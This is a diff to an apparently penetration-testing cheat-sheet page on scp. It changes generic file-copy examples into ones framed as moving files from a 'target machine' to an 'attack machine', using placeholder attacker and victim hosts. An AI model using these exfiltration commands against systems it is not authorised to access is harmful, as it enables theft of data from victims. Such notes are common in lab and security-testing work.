@@ -7,19 +7,12 @@ website:
 render_with_liquid: false
 ---
 
-## Local File -> Remote
+## Transfer File from Target Machine to Attack Machine
 
 ```sh
-scp example.txt kali@10.0.0.1:/home/kali/example.txt
+# If you're on target machine
+scp ./example.txt attacker@<attacker-ip>:/home/<username>/example.txt
 
-# Using private key
-scp -i private_key example.txt username@<remote-ip>:/tmp/example.txt
-```
-
-<br />
-
-## Remote File -> Local
-
-```sh
-scp kali@10.0.0.1:/home/kali/example.txt example.txt
+# If your're on attack machine
+scp victim-user@<target-ip>:./example.txt .
 ```
